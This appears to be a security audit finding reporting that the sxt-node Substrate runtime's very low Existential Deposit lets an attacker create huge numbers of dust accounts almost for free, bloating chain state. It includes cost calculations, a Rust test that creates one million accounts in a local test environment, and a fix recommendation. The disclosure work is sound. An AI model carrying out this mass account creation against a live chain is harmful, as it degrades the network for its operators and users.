# Low Existential Deposit allows mass account creation for near-zero cost

## Description

On substrate-based runtimes, the [Existential Deposit (ED)](https://docs.polkadot.com/polkadot-protocol/glossary/#existential-deposit) is the minimum balance required for an account to remain active. It helps prevent dust accounts from bloating the storage state. If an account’s balance drops below the ED, the Balances pallet reaps (i.e., completely removes) the account and resets its nonce:

> ## Existential Deposit
> The minimum balance an account is allowed to have in the Balances pallet. Accounts cannot be created with a balance less than the existential deposit amount
> 
> If an account balance drops below this amount, the Balances pallet uses a FRAME System API to drop its references to that account.
> 
> If the Balances pallet reference to an account is dropped, the account can be reaped.

In the sxt-node runtime, the Existential Deposit is defined as follows:
```rust
/// Existential deposit.
pub const EXISTENTIAL_DEPOSIT: Balance = 100;
```

The SXT token uses 18 decimals, so 100 base units correspond to:
```rust
100 / 1e18 = 0.0000000000000001 SXT
```


As of writing this report, [the price of SXT](https://www.kucoin.com/price/SXT) is $0.10875. Therefore, each dust account costs:
```rust
0.0000000000000001 SXT × $0.10875 = $0.000000000000010875
```

This extremely low cost opens the door to a state bloat attack. An attacker could create millions or even trillions of dust accounts for a negligible amount of money.

Lets see how much it costs for an attacker to perform a bloat attack:

- **1 million accounts:**
    - Total SXT required: 1_000_000 × 1e-16 = 1e-10 SXT
    - In USD: 1e-10 × 0.10875 = 0.000000010875 USD
    - 1 million accounts cost ≈ $0.000000010875 (≈ 1e-8 cents)

- **1 trillion accounts:**
    - Total SXT required: 1_000_000_000_000 × 1e-16 = 1e-4 SXT
    - In USD: 1e-4 × 0.10875 = 0.000010875 USD
    - 1 trillion accounts cost ≈ $0.000010875
 
**An attacker can create 1 trillion accounts for ~$0.000010875 USD**

## Proof of Concept

The following PoC creates 1 million accounts, each with the exact ED.

To test the scenario, please apply the following diffs:

**Diff to `sxt-node/runtime/Cargo.toml`:**
```diff
diff --git a/runtime/Cargo.toml b/runtime/Cargo.toml
index 4b4bcde..872a8bc 100644
--- a/runtime/Cargo.toml
+++ b/runtime/Cargo.toml
@@ -12,6 +12,9 @@ publish = false
 [package.metadata.docs.rs]
 targets = ["x86_64-unknown-linux-gnu"]
 
+[dev-dependencies]
+sp-io = { workspace = true }
+
 [dependencies]
 codec = { features = [
 	"derive",
```

**Diff to `sxt-node/runtime/lib.rs`:**
```diff
diff --git a/runtime/src/lib.rs b/runtime/src/lib.rs
index b55c87f..aedc775 100644
--- a/runtime/src/lib.rs
+++ b/runtime/src/lib.rs
@@ -102,6 +102,9 @@ pub use {
     pallet_tables,
 };
 
+#[cfg(test)]
+mod poc_ed_test;
+
 /// An index to a block.
 pub type BlockNumber = u32;
 
@@ -1264,4 +1267,4 @@ impl_runtime_apis! {
         }
     }
 
-}
+}
\ No newline at end of file
```

**Create `runtime/src/poc_ed_test.rs`:**
```rust
use frame_support::{
    assert_ok,
    traits::{Currency, GenesisBuild},
};
use frame_system::RawOrigin;
use sp_core::crypto::AccountId32;
use sp_io::TestExternalities;
use sp_runtime::{BuildStorage, MultiAddress};

use crate::{Runtime, System, Balances, EXISTENTIAL_DEPOSIT};

type Balance = <Balances as Currency<AccountId32>>::Balance;

fn get_attacker() -> AccountId32 {
    AccountId32::from([1u8; 32])
}

fn new_test_ext() -> sp_io::TestExternalities {
    let mut storage = frame_system::GenesisConfig::<Runtime>::default()
        .build_storage()
        .unwrap();

    pallet_balances::GenesisConfig::<Runtime> {
        balances: vec![(get_attacker(), EXISTENTIAL_DEPOSIT * 1_000_000 + EXISTENTIAL_DEPOSIT )],
    }
    .assimilate_storage(&mut storage)
    .unwrap();

    let mut ext = TestExternalities::new(storage);
    ext.execute_with(|| System::set_block_number(1));
    ext
}

#[test]
fn can_create_many_accounts_with_ed() {
    new_test_ext().execute_with(|| {
        let attacker = get_attacker();
        let ed = EXISTENTIAL_DEPOSIT;
        let count = 1_000_000;

        for i in 0u32..count {
            let mut bytes = [0u8; 32];
            bytes[0..4].copy_from_slice(&i.to_le_bytes());
            let target = AccountId32::from(bytes);

            assert_ok!(Balances::transfer_keep_alive(
                RawOrigin::Signed(attacker.clone()).into(),
                MultiAddress::Id(target.clone()),
                ed
            ));

            assert!(
                System::account(&target).providers > 0,
                "Account should exist: {:?}",
                target
            );
        }

        println!("✅ Created {} accounts with ED={}", count, ed);
    });
}
```

Run the test:
```bash
$ cd runtime/src/
$ cargo test can_create_many_accounts_with_ed
```

## Recommendation

The Existential Deposit should reflect a meaningful economic cost.
I recommend increasing it to an amount worth at least $0.001 (one-tenth of a cent) or higher.
